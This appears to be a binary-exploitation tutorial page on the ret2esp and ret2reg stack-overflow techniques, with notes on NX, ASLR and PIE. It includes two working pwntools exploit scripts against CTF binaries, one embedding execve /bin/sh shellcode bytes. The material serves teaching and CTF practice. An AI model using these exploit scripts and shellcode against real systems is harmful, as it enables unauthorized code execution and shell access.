## **Rest2esp**

**Because the ESP (Stack Pointer) always points to the top of the stack**, this technique involves replacing the EIP (Instruction Pointer) with the address of a **`jmp esp`** or **`call esp`** instruction. By doing this, the shellcode is placed right after the overwritten EIP. When the `ret` instruction executes, ESP points to the next address, precisely where the shellcode is stored.

If **Address Space Layout Randomization (ASLR)** is not enabled in Windows or Linux, it's possible to use `jmp esp` or `call esp` instructions found in shared libraries. However, with [**ASLR**](../../common-binary-protections-and-bypasses/aslr/) active, one might need to look within the vulnerable program itself for these instructions (and you might need to defeat [**PIE**](../../common-binary-protections-and-bypasses/pie/)).

Moreover, being able to place the shellcode **after the EIP corruption**, rather than in the middle of the stack, ensures that any `push` or `pop` instructions executed during the function's operation don't interfere with the shellcode. This interference could happen if the shellcode were placed in the middle of the function's stack.

### Lacking space

If you are lacking space to write after overwriting RIP (maybe just a few bytes), write an initial `jmp` shellcode like:

```armasm
sub rsp, 0x30
jmp rsp
```

And write the shellcode early in the stack.

### Example

You can find an example of this technique in [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) with a final exploit like:

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
    sub rsp, 10;
    jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```

You can see another example of this technique in [https://guyinatuxedo.github.io/17-stack\_pivot/xctf16\_b0verflow/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/xctf16\_b0verflow/index.html). There is a buffer overflow without NX enabled, it's used a gadget to r**educe the address of `$esp`** and then a `jmp esp;` to jump to the shellcode:

```python
# From https://guyinatuxedo.github.io/17-stack_pivot/xctf16_b0verflow/index.html
from pwn import *

# Establish the target process
target = process('./b0verflow')
#gdb.attach(target, gdbscript = 'b *0x080485a0')

# The shellcode we will use
# I did not write this, it is from: http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Establish our rop gadgets

# 0x08048504 : jmp esp
jmpEsp = p32(0x08048504)

# 0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
pivot = p32(0x80484fd)

# Make the payload

payload = ""
payload += jmpEsp # Our jmp esp gadget
payload += shellcode # Our shellcode
payload += "1"*(0x20 - len(shellcode)) # Filler between end of shellcode and saved return address
payload += pivot # Our pivot gadget

# Send our payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()

```

## Ret2reg

Similarly, if we know a function returns the address where the shellcode is stored, we can leverage **`call eax`** or **`jmp eax`** instructions (known as **ret2eax** technique), offering another method to execute our shellcode. Just like eax, **any other register** containing an interesting address could be used (**ret2reg**).

### Example

You can find some examples here:&#x20;

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)
* [https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c)
  * **`strcpy`** will be store in **`eax`** the address of the buffer where the shellcode was stored and **`eax`** isn't being overwritten, so it's possible use a `ret2eax`.

## Protections

* [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md): If the stack isn't executable this won't help as we need to place the shellcode in the stack and jump to execute it.
* [**ASLR**](../../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../../common-binary-protections-and-bypasses/pie/): Those can make harder to find a instruction to jump to esp or any other register.
